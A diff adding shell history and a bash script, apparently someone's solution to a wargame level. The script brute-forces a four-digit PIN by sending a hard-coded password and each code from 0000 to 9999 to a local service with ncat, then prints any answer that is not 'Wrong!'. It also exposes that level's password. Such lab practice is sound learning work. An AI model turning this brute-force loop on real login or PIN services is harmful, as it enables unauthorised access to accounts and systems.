@@ -1,0 +1,22 @@
+1  ls -al
+2  ncat localhost 30002
+3  mktemp -d
+4  vim /tmp/tmp.f0HsJfIhA0/script.sh
+5  /tmp/tmp.f0HsJfIhA0/script.sh
+6  chmod 777 /tmp/tmp.f0HsJfIhA0/script.sh
+7  /tmp/tmp.f0HsJfIhA0/script.sh
+8  rm -rf /tmp/tmp.f0HsJfIhA0/
+9  rmdir /tmp/tmp.f0HsJfIhA0/
+10  history
+
+
+script.sh ->
+#!/bin/bash
+
+for i in {0000..9999}; do
+	echo $i
+	output=$(echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i | ncat localhost 30002)
+	if [[ ! "$output" =~ "Wrong!" ]]; then
+		echo $output
+	fi
+done	
